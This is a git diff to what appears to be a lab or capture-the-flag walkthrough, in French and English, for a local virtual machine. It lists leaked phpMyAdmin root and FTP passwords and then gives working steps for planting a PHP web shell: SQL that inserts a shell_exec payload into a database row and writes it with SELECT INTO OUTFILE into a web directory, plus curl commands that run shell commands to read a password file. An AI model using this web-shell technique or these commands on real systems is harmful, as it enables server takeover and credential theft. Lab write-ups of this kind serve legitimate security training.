@@ -39,6 +39,7 @@ kali
             /update
             /images
             /index
+            /templates_c
             /backup (403)
             /config (403)
     
@@ -59,4 +60,66 @@ https://192.168.56.101/webmail:
 
 https://192.168.56.101/phpmyadmin:
     connection avec root : Fg-'kKXBj87E:aJ$
+
+
+The goal is to have a script that can execute remote commands on the server
+After some tries, it appears that phpmyadmin's user has read/write access on the directory /var/www/forum/templates_c,
+and that we can execute this script giving it's relative path as url ( /var/www/forum/templates_c/index.php == base_uri/forum/templates_c/index.php )
+
+dans le champ SQL de phpmyadmin :
+    SELECT `content`
+    FROM `mlf2_pages`
+    WHERE id = 1
+    INTO OUTFILE "/var/www/forum/templates_c/index.php"
+
+We have to write in any text field in database, like :
+
+```sql
+
+    INSERT INTO
+        `mlf2_pages`
+        (
+            `order_id`,
+            `title`,
+            `content`,
+            `menu_linkname`,
+            `access`
+        )
+    VALUES
+        (
+            0,
+            "",
+            '<? echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>',
+            "",
+            0
+        )
+```
+
+And then we can write this in a file
+
+```sql
+
+    SELECT
+        `content`
+    FROM
+        `mlf2_pages`
+    WHERE
+        id = 1
+    INTO OUTFILE
+        "/var/www/forum/templates_c/index.php"
+```
+
+( Replace id if necessary )
+We can now access page base_uri/forum/template_c/index.php?cmd=any command
+    https://192.168.56.101/forum/templates_c/index.php?cmd=ls%20-R%20../../
+
+    ```
+    $> curl "https://192.168.56.101/forum/templates_c/index.php?cmd=cat%20/home/LOOKATME/password" -k
+        <pre>lmezard:G!@M6f4Eatau{sF"
+            </pre>
+    ```
+
+It appears that this login/password can be used with Vm's ftp's service
+    ftp lmezard@192.168.56.101
+    password : G!@M6f4Eatau{sF"
 
